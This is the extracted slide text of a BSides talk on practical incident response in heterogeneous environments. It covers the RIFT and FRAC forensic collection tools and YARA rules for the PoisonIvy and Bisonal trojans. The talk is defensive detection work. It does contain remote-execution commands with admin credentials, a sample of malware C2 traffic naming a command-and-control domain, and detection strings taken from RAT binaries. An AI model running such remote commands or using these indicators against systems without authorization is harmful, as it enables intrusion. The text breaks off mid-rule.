          performance.mark('gtm.start');
          (function (w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            j.onload = function () {
              performance.mark('gtm.end');
              performance.measure('gtm', 'gtm.start', 'gtm.end');
            };
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-M36RG8PT');

class="metadata Metadata_root__oCstk" data-cy="metadata"><h1 class="Heading_heading__3MAvZ Heading_h1__3k7S2 title Title_root__svkHQ">BSides IR in Heterogeneous Environment</h1><div class="stats Stats_root__p_BoZ"><time dateTime="2018-05-15 00:31:59 UTC">May 15, 2018</time><span class="Stats_bullet__DbT30"></span><span class="Text_root__is73U Text_weight-strong__yEO2S Text_secondary__EPWj0 Text_medium__rk8Tn Likes_root__WVQ1_ text" style="-webkit-line-clamp:0" tabindex="0">0 likes</span><span class="Stats_bullet__DbT30"></span><span class="Text_root__is73U Text_weight-strong__yEO2S Text_secondary__EPWj0 Text_medium__rk8Tn Likes_root__WVQ1_ text" style="-webkit-line-clamp:0" tabindex="0">697<!-- --> <!-- -->views</span></div><div class="author Author_root___6Bx5"><a data-cy="author-link" class="Author_link___lVxw ellipsis" title="Stefano Maccaglia" href="https://www.slideshare.net/StefanoMaccaglia"><div class="Avatar_root__GNWHY Avatar_initials__EJfVt" style="width:24px;height:24px;line-height:24px">S</div><span>Stefano Maccaglia</span></a></div><div class="description Description_root__kt4uq Description_clamped__PaV_1"><div class="Description_wrapper__hYE9_" data-cy="document-description"><p>The document discusses practical incident response in heterogeneous environments and overcoming limitations of traditional approaches. It proposes utilizing intelligence-driven investigation and actionable IOCs to more flexibly shape the triage process across different operating systems. Examples are provided of using software fingerprinting and debugging symbols to attribute malware and build structured knowledge bases of attackers.<button type="button" class="Button_root__i1yp0 class="VerticalSlideImage_root__64KSA"><img id="slide-image-0" alt="Practical Incident Response in
Heterogeneous Environment
Keven Murphy &amp; Stefano Maccaglia
1
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="eager" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-1-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-1-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-1-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-1-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide2" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-1" alt="The mass-triage problem in 2018
 The investigation process (Triage), in any IT incident, is the key to solve the case and
to clean all the affected systems.
 But in heterogeneous environments, where Windows, Linux, Mac OS, and Unix
systems are potentially affected by the attacker, the investigation process is slowed
by a number of technical complexities.
 First problem is related to a common platform and procedure to adopt for the triage as many
technologies are capable of covering only a portion of the environment.
 Second problem, what to look for, as the triage is aimed to identify malicious artifacts and usual
technologies are not providing flexibility and agility to shape the triage process.
 Third problem, the capability to search the heterogeneous environment using custom IOCs.
 Fourth problem, the possibility to pinpoint known badness which allows for easier mitigation.
 In our approach, the IOCs play an important role both for the investigation process
and the definition of the best way to approach the triage. We were looking to a
rule them all solution aimed to overcome traditional limitations of the most
common commercial solutions.
2
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-2-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-2-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-2-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-2-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide3" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-2" alt="Traditional IOCs application
 The traditional IR approach:
 Context, in regard of IOCs, typically does not exists.
 Application of IOCs to the environment is rule-based
 Customization of IOCs are not an option in some commercial products.
 Rule-based detection will miss changes made to the actors tools
3
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-3-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-3-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-3-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-3-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide4" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-3" alt="Our idea
 The production of code leaves traces in any binary.
 The binary can contain debugging symbols, which give you a lot of information.
 Often the attacker tools include the use of specific libraries or functions.
 A lot of fingerprinting can be done with software, an this is very useful for IR
analyses.
 The combined information of both can help to solve the attribution problem.
 Helps with assessment of risks
 Identifying end goals for known actors
 Aid the creation of IOCs that are actionable and not disposable
4
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-4-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-4-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-4-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-4-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide5" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-4" alt="RIFT (Retrieve Interesting Files Tool)
 Retrieves files/directories based on regex list
 Uses Sleuthkit to retrieve files forensically
 Outputs files files into a directory (machine name)
 Retrieved files are saved remote share/USB
 Recreates the directory structure of where the file was found
 To run:
 Download:
rift --verbose --savedrive [SAVEDRIVE]
https://github.com/chaoticmachinery/frac_rift
5
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-5-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-5-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-5-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-5-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide6" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-5" alt="Getfileslist.txt examples
 getfileslist.txt contains a regex list of files and directories that RIFT will retrieve
6
ntuser.dat$
system32/winevt/logs/
^/etc/
.ssh
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-6-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-6-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-6-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-6-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide7" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-6" alt="FRAC (Forensic Response ACquisition)
 Uses RIFT to forensically retrieve files/directories across the network
 Recommend using PAExec or SSH/SSHPASS to connect to remote machines
 Requires local admin rights and remote share (SMB/NFS depending on OS)
 Supports single IP, CIDR notation, and IP range like the following examples:
 Can be used to execute any command on remote machines
 To run:
172.16.10.12
172.16.10.1/24
172.16.10.1-172.16.10.230
frac_v0.05 --iplist iplist.txt --cmd cmd.txt verbose
paexec.exe [IP] -n 4 -u [ADMINID] -p [ADMINPASS] -s cmd /C &quot;net use
[SHAREDRV] /delete /yes &amp; net use [SHAREDRV] [SHARE]
/user:[SHAREUSERID] [SHAREPASSWD] &amp;&amp; cd /d [SAVEDRIVE] &amp;&amp; rift.exe --
verbose --savedrive [SAVEDRIVE] &amp;&amp; net use [SHAREDRV] /delete /yes&quot;
sshpass -p [ADMINPASS] ssh [IP] &quot;mkdir [SHAREDRV];mount [MNTOPTS]
[SRCBOX]:[SRCMNT] [SHAREDRV] ; cd [SHAREDRV]/frac_v0.05 &amp;&amp; ./rift --
verbose --savedrive [SAVEDRIVE] ; cd / &amp;&amp; umount [SHAREDRV] &amp;&amp; rmdir
[SHAREDRV]&quot;
Examples
of
Cmd.Txt
7
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-7-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-7-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-7-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-7-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide8" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-7" alt="FRAC (Forensic Response Acquisition): The Output
 FRAC/RIFT creates directories with the hostname of the machine
drwxr-xr-x 7 root root 4096 Apr 11 19:39 machinea_04112018_19-18-58
drwxr-xr-x 9 root root 4096 Apr 11 20:11 machineb_04112018_15-19-02
drwxr-xr-x 135 root root 20480 Apr 11 19:37 etc
-rw-r--r-- 1 root root 675539 Apr 11 19:40 getfiles.txt
drwxr-xr-x 3 root root 4096 Apr 11 19:37 home
drwxr-xr-x 3 root root 4096 Apr 11 19:37 opt
drwxr-xr-x 5 root root 4096 Apr 11 19:21 root
-rw-r--r-- 1 root root 230661477 Apr 11 19:43 machineb_04112018_15-19-28_fls.out
drwxr-xr-x 5 root root 4096 Apr 11 19:38 usr
drwxr-xr-x 5 root root 4096 Apr 11 19:40 var
Getfiles.txt
Contains the mactime information for all of the files retrieved as well as the inode
*fls.out
Contains the fls.out (mactime) output from the Sleuthkit FLS command.
All of the directory structure is recreated and files are forensically copied to where
they existed on the drive.
8
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-8-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-8-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-8-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-8-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide9" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-8" alt="Actionable IOCs (AIOCs)
 The concept of actionable IOCs has been derived and refined from a collective set of
Incident Response investigations, and could become a valid support of our investigative
process if organized in a scientifically sound approach.
 Utilizes procedures, analysis, and evidence for a methodical approach
 Based on positive matches can help identify the attacker
 It allow the creation of a structured knowledge base of attackers
 The knowledge base allows the creation of attacker profiles
9
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-9-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-9-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-9-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-9-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide10" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-9" alt="Malware analysis process to build AIOCs
10
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-10-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-10-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-10-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-10-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide11" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-10" alt="Example: PoisonIvy
 PoisonIvy, a Remote Access Tool/Trojan (RAT) often used in targeted attacks, had been
widely seen until around 2013.
 Since then, the number of cases using PoisonIvy decreased, and there was no special
variant with expanded features seen in the wild.
 However, recently, we identified PoisonIvy with expanded features in its communication
function capable to bypass HTTP/HTTPS proxy in APT and cybercriminal attacks thanks to
modifications in the malware code.
Latest PoisonIvy variants are different
11
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-11-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-11-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-11-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-11-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide12" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-11" alt="YARA RULES
PoisonIvy typical IOC
rule poisonivy_1 : rat
{
meta:
description = &quot;Poison Ivy&quot;
author = &quot;Jean-Philippe Teissier / @Jipe_&quot;
date = &quot;2013-02-01&quot;
filetype = &quot;memory&quot;
version = &quot;1.0&quot;
ref1 = &quot;https://code.google.com/p/volatility/source/browse/trunk/contrib/plugins/malware/poisonivy.py
strings:
$a = { 53 74 75 62 50 61 74 68 ?? 53 4F 46 54 57 41 52 45 5C 43 6C 61 73 73 65 73 5C 68 74 74 70 5C 73 68 65 6C
6C 5C 6F 70 65 6E 5C 63 6F 6D 6D 61 6E 64 [22] 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 41 63
74 69 76 65 20 53 65 74 75 70 5C 49 6E 73 74 61 6C 6C 65 64 20 43 6F 6D 70 6F 6E 65 6E 74 73 5C }
condition:
$a
}
rule PoisonIvy_2
{
meta:
author = &quot; Kevin Breen &lt;kevin@techanarchy.net&gt;&quot;
date = &quot;2014/04&quot;
ref = &quot;http://malwareconfig.com/stats/PoisonIvy&quot;
maltype = &quot;Remote Access Trojan&quot;
filetype = &quot;exe&quot;
strings:
$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}
$string1 = &quot;CONNECT %s:%i HTTP/1.0&quot;
$string2 = &quot;ws2_32&quot;
$string3 = &quot;cks=u&quot;
$string4 = &quot;thj@h&quot;
$string5 = &quot;advpack&quot;
condition:
$stub at 0x1620 and all of ($string*) or (all of them)
}
} rule PoisonIvy_Generic_3 {
meta:
description = &quot;PoisonIvy RAT Generic Rule&quot;
author = &quot;Florian Roth&quot;
date = &quot;2015-05-14&quot;
hash = &quot;e1cbdf740785f97c93a0a7a01ef2614be792afcd&quot;
strings:
$k1 = &quot;Tiger324{&quot; fullword ascii
$s2 = &quot;WININET.dll&quot; fullword ascii
$s3 = &quot;mscoree.dll&quot; fullword wide
$s4 = &quot;WS2_32.dll&quot; fullword
$s5 = &quot;Explorer.exe&quot; fullword wide
$s6 = &quot;USER32.DLL&quot;
$s7 = &quot;CONOUT$&quot;
$s8 = &quot;login.asp&quot;
$h1 = &quot;HTTP/1.0&quot;
$h2 = &quot;POST&quot;
$h3 = &quot;login.asp&quot;
$h4 = &quot;check.asp&quot;
$h5 = &quot;result.asp&quot;
$h6 = &quot;upload.asp&quot;
condition:
uint16(0) == 0x5a4d and filesize &lt; 500KB and
(
$k1 or all of ($s*) or all of ($h*)
)
rule PoisonIvy_Sample_APT {
meta:
description = &quot;Detects a PoisonIvy APT malware group&quot;
author = &quot;Florian Roth&quot;
reference = &quot;VT Analysis&quot;
date = &quot;2015-06-03&quot;
hash = &quot;b874b76ff7b281c8baa80e4a71fc9be514093c70&quot;
strings:
$s0 = &quot;pidll.dll&quot; fullword ascii
$s1 = &quot;sens32.dll&quot; fullword wide
$s3 = &quot;FileDescription&quot; fullword wide
$s4 = &quot;OriginalFilename&quot; fullword
$s5 = &quot;ZwSetInformationProcess&quot; fullword ascii
$s9 = &quot;Microsoft Media Device Service Provider&quot; fullword wide
condition:
uint16(0) == 0x5a4d and filesize &lt; 47KB and all of them
} 12
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-12-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-12-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-12-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-12-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide13" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-12" alt="rule PoisonIvy {
strings:
$s1 = &quot;%supdate%4d%02d%02d%02d%02d%02d.tmp&quot; wide ascii
$s2 = &quot;cks=u&quot; wide ascii
$s3 = CONNECT %s:%i HTTP//1.0 wide ascii
$s4 = vry7fo/URLDownez{ wide ascii
$s5 = 6u%u.193.%d wide ascii
$s6 = /c del %s &gt; nul wide ascii
$s7 = %u.193.%d.%d wide ascii
$s8 = GET %s HTTP/1.1 wide ascii
condition:
($s1 and $s2 and $s3) or ($s4 and $s5) or ($s6 and $s7 and $s8) and
// MZ signature at offset 0 and ...
uint16(0) == 0x5A4D and
// ... PE signature at offset stored in MZ header at 0x3C
uint32(uint32(0x3C)) == 0x00004550
}
YARA RULES
PoisonIvy Actionable IOC: Yara rule
The first three strings identify the
PoisonIvy generic variants, including
latest ones.
These strings match an old version of
PoisonIvy 2011 packed in UPX.
For the same sample, we use these
strings to match the decompressed
version of PoisonIvy (always 2011).
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-13-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-13-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-13-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-13-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide14" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-13" alt="AIOCs formalization process
Atomic
IOCs
High order Yara
rules for files
and packets
Actor tags and
attack
descriptions
Actor tools
High order
ClamAV signature
High order log and
system artifacts
System and
network
visibility
Alternative
System
visibility
Log and
artifacts
visibility
Classification and attribution
Virustotal
and other
repository
searches
Evolutive and comparative analysis
formalization
14
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-14-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-14-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-14-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-14-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide15" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-14" alt=" Bisonal is another example. It is a backdoor.
 The malware can be split into two components:
 the main module,
 communication module.
 The main module is responsible for providing the framework to execute the various
components within the malware.
 The communication module is responsible for the sending of information to the server,
receiving new commands from it and downloading of new executable.
 If a new executable is downloaded successfully, it will notifying the main
module to execute it.
 The malware is capable of:
 Listing and controlling processes
 Creating and deleting files
 Creating a remote shell
 Downloading and executing files
 Bisonal is an APT tool.
Trojan.Bisonal
15
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-15-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-15-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-15-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-15-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide16" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-15" alt="Trojan.Bisonal traffic
 Custom flag and c2 domain  used to track victim
16

User-Agent: flag:khi host:Business IP:10.0.0.51
OS:XPSP3 vm:.. proxy:..
Host: online.cleansite.us
Cache-Control: no-cache

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-16-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-16-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-16-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-16-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide17" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-16" alt="Trojan.Bisonal resulting AIOC description
o Type of malware: Modular Trojan (single stage), mainly used for data stealing
o Capabilities: beaconing, listing and controlling processes, creating and deleting files, creating
remote shells, downloading and executing files
o Dissemination strategy: via Dropper or email attachment
o Architecture: Client / Server using public C2s
o Type of communication: HTTP protocol (in general it uses TCP/80 and TCP/443, but port can be
customized)
o Related Adversary: HeartBeat APT Group (Chinese)
o Earlier Adversary detection: November 2009 (South Korea - TrendMicro)
o Area of operation: actually limited to Asia (including Russia)
o Recorded targets: Mitsubishi Heavy Industries, NEC Corp, Nippon Steel Corp, IHI Corp, several
Ministries in Japan and South Korea.
o Type of AIOCs developed: Yara rules for files, Yara rules for PCAPs, ClamAV rules, Snort Rule,
Registry and logs.
17
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-17-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-17-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-17-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-17-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide18" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-17" alt="Bisonal Behavior

 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-18-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-18-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-18-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-18-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide19" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-18" alt="YARA RULES
rule Trojan.Bisonal {
strings:
$s1 = &quot;wkko%00hhh1y~|t}ppt1|pr0Josp~{Yvsz0y~rz0g0p/1~lo&quot; wide ascii
$s2 = &quot;defa&quot; wide ascii
$s3 = &quot;love a meng&quot; wide ascii
$s4 = &quot;HE@L-PShellE&quot; wide ascii
$s5 = &quot;xecut&quot;
$s6 = &quot;wkko%00yjq{1|r|1pm1tm0Josp~{Yvsz0y~rz0g0p/1~lo&quot; wide ascii
$s7 = &quot;http://%s/%s.asp?id=%s%s%s&quot;
$s8 = &quot;http://%s/a.asp?id=%s%s&quot;
$s9 = &quot;c:a1.txt
condition:
($s1 and $s2) or ($s2 and $s3) or ($s4 and $5) and ($s6 and $s7 and $s8 and $s9) and
// MZ signature at offset 0 and ...
uint16(0) == 0x5A4D and
// ... PE signature at offset stored in MZ header at 0x3C
uint32(uint32(0x3C)) == 0x00004550
}
Trojan.Bisonal family
the first two strings are
common to other Bisonal
samples, but not all.
The latest samples contain different
strings, except for $s6 string which is
very similar to the first string in
conditition $s1.
These strings match a Bisonal sample
that uses a common obfuscation
techniques(split a word in more
lines).
Beyond the common string defa the
samples of bisonal present different
string.
19
 " class="vertical-slide-image VerticalSlideImage_image__VtE4p" data-testid="vertical-slide-image" loading="lazy" srcSet="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-19-320.jpg 320w, https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-19-638.jpg 638w, https://image.slidesharecdn.com/bsidesfinal-180515003159/75/BSides-IR-in-Heterogeneous-Environment-19-2048.jpg 2048w" src="https://image.slidesharecdn.com/bsidesfinal-180515003159/85/BSides-IR-in-Heterogeneous-Environment-19-320.jpg" sizes="100vw"/></div><!--$--><!--/$--></div></div><div><div id="slide20" class="VerticalSlide_root__jU_9r slide-item" style="aspect-ratio:960 / 540" data-cy="slide-container"><div class="VerticalSlideImage_root__64KSA"><img id="slide-image-19" alt=" Flag:727x

YARA RULES toward AIOCs
Trojan.Bisonal family
rule campaignA {
